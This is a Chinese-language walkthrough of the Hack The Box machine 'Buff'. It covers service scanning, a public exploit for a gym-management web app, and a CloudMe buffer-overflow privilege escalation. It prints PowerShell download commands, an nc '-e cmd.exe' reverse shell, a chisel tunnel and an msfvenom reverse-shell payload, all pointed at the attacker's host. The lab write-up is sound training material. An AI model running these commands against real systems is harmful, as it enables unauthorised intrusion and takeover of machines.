# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测
```
─(root💀kali)-[~/htb/buff]
└─# nmap -sV -Pn 10.10.10.198 -p-
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-01 07:24 EST
Nmap scan report for 10.10.10.198
Host is up (0.42s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 750.50 seconds

```

## 目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.10.198:8080/                                                                             

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.198-8080/-_21-12-01_07-29-25.txt

Error Log: /root/dirsearch/logs/errors-21-12-01_07-29-25.log

Target: http://10.10.10.198:8080/

[07:29:30] Starting: 
[07:30:04] 200 -   66B  - /.gitattributes                                               
[07:30:31] 200 -  309B  - /Readme.md                                        
[07:30:31] 200 -  309B  - /README.md
[07:30:31] 200 -  309B  - /ReadMe.md
[07:30:31] 200 -  309B  - /README.MD                                        
[07:30:31] 200 -   18KB - /LICENSE
[07:30:32] 301 -  344B  - /Upload  ->  http://10.10.10.198:8080/Upload/     
[07:30:32] 403 -    1KB - /Trace.axd::$DATA                                 
[07:30:47] 200 -    5KB - /about.php                                        
[07:32:06] 403 -    1KB - /cgi-bin/                                          
[07:32:07] 403 -    1KB - /cgi.pl/                                           
[07:32:08] 400 -  983B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd      
[07:32:11] 200 -    1KB - /cgi-bin/printenv.pl                               
[07:32:16] 200 -    4KB - /contact.php                                       
[07:32:27] 200 -    4KB - /edit.php                                          
[07:32:28] 403 -    1KB - /error/                                                                                
[07:32:32] 200 -    4KB - /feedback.php                                      
[07:32:42] 200 -  143B  - /home.php                                          
[07:32:43] 301 -  341B  - /img  ->  http://10.10.10.198:8080/img/            
[07:32:44] 403 -    1KB - /include/                                          
[07:32:44] 301 -  345B  - /include  ->  http://10.10.10.198:8080/include/    
[07:32:45] 403 -    1KB - /index.php::$DATA                                  
[07:32:47] 200 -    5KB - /index.php                                         
[07:32:47] 200 -    5KB - /index.php/login/
[07:32:47] 200 -    5KB - /index.php.                                        
[07:32:47] 200 -    5KB - /index.pHp                                         
[07:32:53] 200 -   18KB - /license                                                                     
[07:33:22] 301 -  345B  - /profile  ->  http://10.10.10.198:8080/profile/    
[07:33:24] 200 -  309B  - /readme.md                                         
[07:33:26] 200 -  137B  - /register.php                                      
[07:33:29] 403 -    1KB - /server-info                                                                      
[07:33:46] 200 -  209B  - /up.php                                            
[07:33:47] 301 -  344B  - /upload  ->  http://10.10.10.198:8080/upload/      
[07:33:48] 403 -    1KB - /upload/                                           
[07:33:48] 200 -  107B  - /upload.php                                        
[07:33:53] 403 -    1KB - /web.config::$DATA                                 
[07:33:55] 403 -    1KB - /webalizer    
```

爆出了很多文件，一个个查看

readme.md文件
```
gym management system
===================

Gym Management System

This the my gym management system it is made using PHP,CSS,HTML,Jquery,Twitter Bootstrap.
All sql table info can be found in table.sql.


more free projects

click here - https://projectworlds.in


YouTube Demo - https://youtu.be/J_7G_AahgSw


```

说是有一个sql文件，我们浏览器打开```table.sql```，下载到本地。没有暴露出密码，不过我们至少知道了表结构和字段


/cgi-bin/printenv.pl暴露了一些配置信息
```
COMSPEC="C:\Windows\system32\cmd.exe"
CONTEXT_DOCUMENT_ROOT="C:/xampp/cgi-bin/"
CONTEXT_PREFIX="/cgi-bin/"
DOCUMENT_ROOT="C:/xampp/htdocs/gym"
GATEWAY_INTERFACE="CGI/1.1"
HTTP_ACCEPT="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
HTTP_ACCEPT_ENCODING="gzip, deflate"
HTTP_ACCEPT_LANGUAGE="en-US,en;q=0.5"
HTTP_CONNECTION="close"
HTTP_COOKIE="sec_session_id=je937e2bbb8rk56gfbtpl4ctld"
HTTP_HOST="10.10.10.198:8080"
HTTP_UPGRADE_INSECURE_REQUESTS="1"
HTTP_USER_AGENT="Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
MIBDIRS="C:/xampp/php/extras/mibs"
MYSQL_HOME="\xampp\mysql\bin"
OPENSSL_CONF="C:/xampp/apache/bin/openssl.cnf"
PATH="C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\shaun\AppData\Local\Microsoft\WindowsApps"
PATHEXT=".COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC"
PHPRC="\xampp\php"
PHP_PEAR_SYSCONF_DIR="\xampp\php"
QUERY_STRING=""
REMOTE_ADDR="10.10.14.15"
REMOTE_PORT="53838"
REQUEST_METHOD="GET"
REQUEST_SCHEME="http"
REQUEST_URI="/cgi-bin/printenv.pl"
SCRIPT_FILENAME="C:/xampp/cgi-bin/printenv.pl"
SCRIPT_NAME="/cgi-bin/printenv.pl"
SERVER_ADDR="10.10.10.198"
SERVER_ADMIN="postmaster@localhost"
SERVER_NAME="10.10.10.198"
SERVER_PORT="8080"
SERVER_PROTOCOL="HTTP/1.1"
SERVER_SIGNATURE="<address>Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 Server at 10.10.10.198 Port 8080</address>\n"
SERVER_SOFTWARE="Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6"
SYSTEMROOT="C:\Windows"
TMP="\xampp\tmp"
WINDIR="C:\Windows"
```

找了一圈文件，好像没啥特别可以利用的东西。注意到网站好像是用某个cms做的，用```Projectworlds.in  exploit```做关键词，我们找到了这个cms的[一个攻击脚本](https://www.exploit-db.com/exploits/48506)

拿到初始shell
```
┌──(root💀kali)-[~/htb/buff]
└─# python exp.py http://10.10.10.198:8080/                                                                                                                                                                                                  1 ⨯
            /\
/vvvvvvvvvvvv \--------------------------------------,                                                                                                                                                                                           
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> whoami
�PNG
▒
buff\shaun

```

# 提权
这个exp的shell非常难用，我们传两个实用工具到靶机，开一个趁手的shell

> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.15:8000/nc.exe','C:\xampp\htdocs\gym\upload\nc.exe')

> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.15:8000/wget.exe','C:\xampp\htdocs\gym\upload\wget.exe')

靶机运行：
> nc.exe 10.10.14.15 4242 -e cmd.exe

接收到反弹shell：
```
┌──(root💀kali)-[~/htb/buff]
└─# nc -lnvp 4242                                                                                                                                                                                                                          130 ⨯
listening on [any] 4242 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.198] 55993
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\gym\upload>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\gym\upload> 

```
# 提权

查看所有正在监听的网络连接
```
C:\xampp\htdocs\gym\upload>netstat -ano | findstr "LISTENING"
netstat -ano | findstr "LISTENING"
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       948
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       6012
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       5200
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       7228
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       524
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1136
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1640
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2212
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       672
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       688
  TCP    10.10.10.198:139       0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING       2824
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       2356
  TCP    [::]:135               [::]:0                 LISTENING       948
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:7680              [::]:0                 LISTENING       5200
  TCP    [::]:8080              [::]:0                 LISTENING       7228
  TCP    [::]:49664             [::]:0                 LISTENING       524
  TCP    [::]:49665             [::]:0                 LISTENING       1136
  TCP    [::]:49666             [::]:0                 LISTENING       1640
  TCP    [::]:49667             [::]:0                 LISTENING       2212
  TCP    [::]:49668             [::]:0                 LISTENING       672
  TCP    [::]:49669             [::]:0                 LISTENING       688


```

可以看见有两个端口只监听了本地连接，分别是3306数据库还有一个 未知的8888端口服务。
数据库只允许本地连接很正常，多数是为了安全考虑。
这个8888端口服务有时候枚举不出来，我用winpea没有发现，找了半天。。。手动枚举有时候也会不出来

记住8888端口的PID是：2356

这个服务的PID每隔一段时间就会变，非常坑爹

根据PID找二进制文件，我们使用下面命令：

> tasklist /v | findstr 2356


最后定位到是一个叫```CloudMe```的程序
```
c:\Users\shaun\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of c:\Users\shaun\Downloads

14/07/2020  12:27    <DIR>          .
14/07/2020  12:27    <DIR>          ..
16/06/2020  15:26        17,830,824 CloudMe_1112.exe
               1 File(s)     17,830,824 bytes
               2 Dir(s)   7,572,029,440 bytes free

```

在kali上搜索这个程序的漏洞情况
```
┌──(root💀kali)-[~/htb/buff]
└─# searchsploit CloudMe      
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CloudMe 1.11.2 - Buffer Overflow (PoC)                                                                                                                                                                    | windows/remote/48389.py
CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                                                                                                                                                           | windows/local/48499.txt
CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR)                                                                                                                                                           | windows/local/48840.py
Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                                                                                                                                                          | windows_x86-64/remote/45197.rb
CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)                                                                                                                                                   | windows_x86-64/local/45159.py
CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)                                                                                                                                            | windows/remote/44175.rb
CloudMe Sync 1.11.0 - Local Buffer Overflow                                                                                                                                                               | windows/local/44470.py
CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                                                                                                                                           | windows/remote/46218.py
CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)                                                                                                                                                  | windows_x86-64/remote/46250.py
CloudMe Sync < 1.11.0 - Buffer Overflow                                                                                                                                                                   | windows/remote/44027.py
CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)                                                                                                                                                | windows_x86-64/remote/44784.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

我们把48389.py拷贝到当前目录

然而不幸的是靶机的环境并没有安装python，因此得另寻办法。

## 隧道

我们用[chisel](https://github.com/jpillora/chisel/releases)在靶机和攻击机之间建立一条隧道

在github上下载靶机使用的exe文件，以及kali使用的bash文件


靶机从kali下载chisel.exe
```
c:\xampp\htdocs\gym\upload>wget http://10.10.14.15:8000/chisel.exe
wget http://10.10.14.15:8000/chisel.exe
--10:54:21--  http://10.10.14.15:8000/chisel.exe
           => `chisel.exe'
Connecting to 10.10.14.15:8000... connected.
HTTP request sent, awaiting response... 200 OK
10:54:28 (1.20 MB/s) - `chisel.exe' saved [8548352/8548352]

```

kali服务端开启监听
> ./chisel server -p 8000 --reverse

windows客户端连接：
> .\chisel.exe client 10.10.14.15:8000 R:8888:localhost:8888


在kali上已经看到转发的8888端口服务：
```
┌──(root💀kali)-[~/htb/buff]
└─# netstat -ano |grep 8888
tcp6       0      0 :::8888                 :::*                    LISTEN      off (0.00/0/0)
```

我们用以下payload生成bof的字节码

> msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 -b '\x00\x0A\x0D' -f python 

更新到48389.py的payload里

在kali开启一个监听：
> nc -lnvp 443

在kali执行
```
┌──(root💀kali)-[~/htb/buff]
└─# python3 48389.py    
```


收到靶机的反弹shell，已经是administrator权限
```
┌──(root💀kali)-[~/htb/buff]
└─# nc -lnvp 443                
listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.198] 49686
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
buff\administrator

C:\Windows\system32>
```